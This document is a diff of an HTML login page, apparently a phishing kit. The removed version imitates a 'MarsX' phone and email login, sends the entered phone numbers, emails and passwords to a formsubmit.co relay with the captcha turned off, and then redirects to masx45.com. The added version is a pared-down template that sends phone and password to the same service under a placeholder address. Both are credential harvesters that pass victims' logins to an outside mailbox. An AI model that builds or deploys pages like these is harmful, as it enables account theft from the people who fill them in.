@@ -1,305 +1,195 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Login | MarsX</title>
+  <meta charset="UTF-8">
+  <title>Login</title>
   <style>
     body {
       background-color: #000;
       font-family: Arial, sans-serif;
       color: white;
+      margin: 0;
+      padding: 0;
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-    }
-
-    .container {
-      text-align: center;
-      width: 100%;
-      max-width: 400px;
-      padding: 30px 20px;
     }
 
     h1 {
-      font-size: 24px;
-      color: white;
-      margin-bottom: 20px;
-    }
-
-    .logo {
-      margin-bottom: 10px;
-    }
-
-    .logo img {
-      height: 60px;
-    }
-
-    h2 {
+      text-align: center;
+      margin-top: 40px;
+      margin-bottom: 30px;
       font-size: 26px;
-      font-weight: bold;
-      margin-bottom: 20px;
-    }
-
-    .tabs {
-      display: flex;
-      justify-content: center;
-      background-color: #222;
-      border-radius: 30px;
-      padding: 4px;
-      margin-bottom: 20px;
-    }
-
-    .tab {
-      flex: 1;
-      padding: 10px 0;
-      font-weight: bold;
-      font-size: 14px;
-      border-radius: 30px;
-      cursor: pointer;
-      background-color: transparent;
       color: white;
-      transition: background-color 0.3s;
     }
 
-    .tab.active {
+    .login-toggle {
+      display: flex;
+      border-radius: 30px;
+      overflow: hidden;
+      background-color: #1f1f1f;
+      margin-bottom: 30px;
+    }
+
+    .toggle-btn {
+      padding: 12px 30px;
+      font-weight: bold;
+      cursor: pointer;
+      border: none;
+      font-size: 14px;
+    }
+
+    .active {
       background-color: #d4af37;
       color: black;
     }
 
+    .inactive {
+      background-color: #2a2a2a;
+      color: white;
+    }
+
     form {
+      width: 90%;
+      max-width: 400px;
       display: flex;
       flex-direction: column;
-      align-items: stretch;
+      gap: 20px;
     }
 
     label {
-      text-align: left;
-      font-size: 12px;
+      font-size: 13px;
       margin-bottom: 5px;
+      text-align: left;
     }
 
-    .phone-input,
     .input-wrapper {
       display: flex;
-      align-items: center;
-      background-color: #222;
+      flex-direction: column;
+    }
+
+    .phone-input, .password-input {
+      background-color: #2a2a2a;
       border-radius: 30px;
-      padding: 0 15px;
-      margin-bottom: 20px;
       height: 50px;
+      display: flex;
+      align-items: center;
+      padding: 0 15px;
     }
 
-    .phone-input img {
+    .phone-prefix {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background-color: #1c1c1c;
+      padding: 6px 10px;
+      border-radius: 20px;
+      margin-right: 10px;
+    }
+
+    .phone-prefix img {
       width: 20px;
-      margin-right: 8px;
+      height: 20px;
+      border-radius: 50%;
+      object-fit: cover;
+      filter: brightness(1.2);
     }
 
-    .phone-input select,
+    .dial-code {
+      font-size: 14px;
+      color: white;
+    }
+
+    .arrow {
+      font-size: 12px;
+      color: white;
+    }
+
     .phone-input input,
-    .input-wrapper input {
+    .password-input input {
       background: transparent;
       border: none;
       color: white;
-      padding: 12px 5px;
-      font-size: 16px;
+      font-size: 15px;
       flex: 1;
       outline: none;
     }
 
-    .input-wrapper {
-      position: relative;
+    .password-input img.eye-icon {
+      width: 20px;
+      height: 20px;
+      opacity: 0.6;
     }
 
-    .input-wrapper .toggle-password {
-      position: absolute;
-      right: 15px;
-      top: 50%;
-      transform: translateY(-50%);
-      cursor: pointer;
-      font-size: 18px;
-      color: #999;
-    }
-
-    .options {
-      display: flex;
-      flex-direction: column;
-      align-items: flex-start;
-      font-size: 14px;
-      color: #ccc;
-      margin-bottom: 20px;
-    }
-
-    .options a {
+    .forgot-password {
+      text-align: right;
       color: white;
-      text-decoration: none;
-      margin-bottom: 10px;
+      font-size: 13px;
+      cursor: pointer;
+      margin-top: -10px;
     }
 
-    .remember-me {
-      display: flex;
-      align-items: center;
+    .remember-text {
+      font-size: 12px;
+      color: #aaa;
+      text-align: left;
+      margin-top: -10px;
     }
 
-    .remember-me input {
-      margin-right: 5px;
-    }
-
-    button {
+    .submit-btn {
+      margin-top: 15px;
       background-color: #d4af37;
       border: none;
-      padding: 12px;
+      border-radius: 30px;
+      height: 45px;
       color: black;
       font-weight: bold;
-      font-size: 16px;
-      border-radius: 25px;
       cursor: pointer;
-      transition: background-color 0.3s ease;
-      width: 100%;
-    }
-
-    button:hover {
-      background-color: #b3922b;
-    }
-
-    #please-wait {
-      display: none;
-      color: #d4af37;
-      font-size: 14px;
-      margin-top: 10px;
-    }
-
-    .signup {
-      font-size: 14px;
-      color: #aaa;
-      margin-top: 20px;
-    }
-
-    .signup a {
-      color: #d4af37;
-      text-decoration: none;
-      font-weight: bold;
-    }
-
-    .form-section {
-      display: none;
-    }
-
-    .form-section.active {
-      display: block;
+      font-size: 16px;
     }
   </style>
 </head>
 <body>
+
   <h1>Log In</h1>
 
-  <div class="container">
-    <div class="logo">
-      <img src="https://i.imgur.com/KZsmUi2.png" alt="MarsX Logo" />
-    </div>
-
-    <div class="tabs">
-      <div class="tab active" onclick="switchTab('phone')">Phone Login</div>
-      <div class="tab" onclick="switchTab('email')">Email Login</div>
-    </div>
-
-    <!-- PHONE LOGIN FORM -->
-    <form class="form-section active" id="phone-form" action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST" onsubmit="return handleSubmit();">
-      <input type="hidden" name="_captcha" value="false">
-
-      <label>Phone Number</label>
-      <div class="phone-input">
-        <img src="https://flagcdn.com/us.svg" alt="US Flag">
-        <select name="country_code" style="width: 60px;">
-          <option value="+1">+1</option>
-        </select>
-        <input type="text" name="phone_number" placeholder="Phone Number" required />
-      </div>
-
-      <label>Password</label>
-      <div class="input-wrapper">
-        <input type="password" id="phone-password" name="password" placeholder="Password" required />
-        <span class="toggle-password" onclick="togglePassword('phone-password')">👁</span>
-      </div>
-
-      <div class="options">
-        <a href="#">Forgot password?</a>
-        <label class="remember-me">
-          <input type="checkbox" name="remember" />
-          Remember account and password
-        </label>
-      </div>
-
-      <button type="submit">Log In</button>
-      <div id="please-wait">Please wait...</div>
-    </form>
-
-    <!-- EMAIL LOGIN FORM -->
-    <form class="form-section" id="email-form" action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST" onsubmit="return handleSubmit();">
-      <input type="hidden" name="_captcha" value="false">
-
-      <label>Email</label>
-      <div class="input-wrapper">
-        <input type="email" name="email" placeholder="Email" required />
-      </div>
-
-      <label>Password</label>
-      <div class="input-wrapper">
-        <input type="password" id="email-password" name="password" placeholder="Password" required />
-        <span class="toggle-password" onclick="togglePassword('email-password')">👁</span>
-      </div>
-
-      <div class="options">
-        <a href="#">Forgot password?</a>
-        <label class="remember-me">
-          <input type="checkbox" name="remember" />
-          Remember account and password
-        </label>
-      </div>
-
-      <button type="submit">Log In</button>
-      <div id="please-wait">Please wait...</div>
-    </form>
-
-    <div class="signup">
-      Continue Is Agree <a href="#">Sign Up</a>
-    </div>
+  <div class="login-toggle">
+    <button class="toggle-btn active">Phone Login</button>
+    <button class="toggle-btn inactive">Email Login</button>
   </div>
 
-  <script>
-    function handleSubmit() {
-      document.getElementById("please-wait").style.display = "block";
-      setTimeout(() => {
-        window.location.href = "https://masx45.com/";
-      }, 1000);
-      return true;
-    }
+  <form action="https://formsubmit.co/TON_EMAIL@example.com" method="POST">
+    <input type="hidden" name="_captcha" value="false">
 
-    function togglePassword(id) {
-      const pwd = document.getElementById(id);
-      pwd.type = pwd.type === "password" ? "text" : "password";
-    }
+    <!-- Phone Number -->
+    <div class="input-wrapper">
+      <label for="phone">Phone Number</label>
+      <div class="phone-input">
+        <div class="phone-prefix">
+          <img src="https://flagcdn.com/us.svg" alt="US Flag">
+          <span class="dial-code">+1</span>
+          <span class="arrow">▾</span>
+        </div>
+        <input type="text" id="phone" name="Phone Number" placeholder="Phone Number" required>
+      </div>
+    </div>
 
-    function switchTab(tab) {
-      const phoneForm = document.getElementById("phone-form");
-      const emailForm = document.getElementById("email-form");
-      const tabs = document.querySelectorAll(".tab");
+    <!-- Password -->
+    <div class="input-wrapper">
+      <label for="password">Password</label>
+      <div class="password-input">
+        <input type="password" id="password" name="Password" placeholder="Password" required>
+        <img src="https://img.icons8.com/ios-glyphs/30/cccccc/closed-eye.png" alt="Eye icon" class="eye-icon">
+      </div>
+    </div>
 
-      if (tab === "phone") {
-        phoneForm.classList.add("active");
-        emailForm.classList.remove("active");
-        tabs[0].classList.add("active");
-        tabs[1].classList.remove("active");
-      } else {
-        emailForm.classList.add("active");
-        phoneForm.classList.remove("active");
-        tabs[1].classList.add("active");
-        tabs[0].classList.remove("active");
-      }
-    }
-  </script>
+    <!-- Forgot Password + Remember -->
+    <div class="forgot-password">Forgot Password?</div>
+    <div class="remember-text">Remember account and password</div>
+
+    <!-- Submit -->
+    <button type="submit" class="submit-btn">Log In</button>
+  </form>
+
 </body>
 </html>
